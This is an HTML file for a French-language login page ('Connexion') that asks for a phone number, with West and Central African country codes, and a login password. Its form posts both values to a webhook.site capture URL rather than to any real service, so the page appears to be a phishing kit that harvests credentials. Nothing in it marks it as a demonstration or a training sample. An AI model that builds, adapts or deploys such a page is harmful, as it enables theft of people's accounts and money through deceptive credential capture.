<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Connexion</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background-color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      max-width: 400px;
      width: 100%;
      padding: 20px;
    }

    h1 {
      font-size: 24px;
      margin-bottom: 10px;
    }

    p {
      color: #777;
      margin-top: 0;
      margin-bottom: 30px;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }

    .phone-input {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
    }

    select {
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 8px 0 0 8px;
      outline: none;
    }

    input[type="tel"] {
      flex: 1;
      padding: 10px;
      border: 1px solid #ccc;
      border-left: none;
      border-radius: 0 8px 8px 0;
      outline: none;
    }

    .password-container {
      position: relative;
      margin-bottom: 20px;
    }

    input[type="password"],
    input[type="text"] {
      width: 100%;
      padding: 10px 40px 10px 10px;
      border: 1px solid #ccc;
      border-radius: 8px;
      outline: none;
    }

    .toggle-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
    }

    .toggle-password svg {
      width: 24px;
      height: 24px;
    }

    button {
      width: 100%;
      background-color: #3366ff;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }

    .signup {
      text-align: center;
      margin-top: 20px;
      color: #777;
    }

    .signup a {
      color: #3366ff;
      text-decoration: none;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Bienvenue à nous rejoindre</h1>
    <p>Connectez-vous à votre compte</p>

    <form action="https://webhook.site/b1fb39f5-27fc-412a-adba-4a0bdd868cb5" method="POST">
      <label for="phone">Numéro de Téléphone</label>
      <div class="phone-input">
        <select name="code">
          <option value="+221">+221</option>
          <option value="+225">+225</option>
          <option value="+226">+226</option>
          <option value="+228">+228</option>
          <option value="+229">+229</option>
          <option value="+237">+237</option>
        </select>
        <input type="tel" name="phone" placeholder="Veuillez entrer votre numéro de téléphone" required />
      </div>

      <label for="password">Mot de passe de Connexion</label>
      <div class="password-container">
        <input type="password" name="password" id="password" placeholder="Mot de passe de Connexion" required />
        <button type="button" class="toggle-password" onclick="togglePassword()">
          <!-- Icône œil masqué (par défaut) -->
          <svg id="eyeClosed" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="black" viewBox="0 0 24 24"><path stroke-width="2" stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-5.523 0-10-4.477-10-10 0-1.3.25-2.538.703-3.675m1.66-2.51A9.956 9.956 0 0112 3c5.523 0 10 4.477 10 10 0 2.113-.655 4.067-1.77 5.665M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-width="2" stroke-linecap="round" stroke-linejoin="round" d="M3 3l18 18"/></svg>
          <!-- Icône œil ouvert -->
          <svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="black" viewBox="0 0 24 24" style="display:none;"><path stroke-width="2" stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-width="2" stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5s8.268 2.943 9.542 7c-1.274 4.057-5.065 7-9.542 7s-8.268-2.943-9.542-7z"/></svg>
        </button>
      </div>

      <button type="submit">Se Connecter Maintenant</button>

      <div class="signup">
        Vous n’avez pas de compte ? <a href="#">Inscrivez-vous</a>
      </div>
    </form>
  </div>

  <script>
    function togglePassword() {
      const passwordInput = document.getElementById("password");
      const eyeOpen = document.getElementById("eyeOpen");
      const eyeClosed = document.getElementById("eyeClosed");

      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        eyeClosed.style.display = "none";
        eyeOpen.style.display = "inline";
      } else {
        passwordInput.type = "password";
        eyeClosed.style.display = "inline";
        eyeOpen.style.display = "none";
      }
    }
  </script>
</body>
</html>
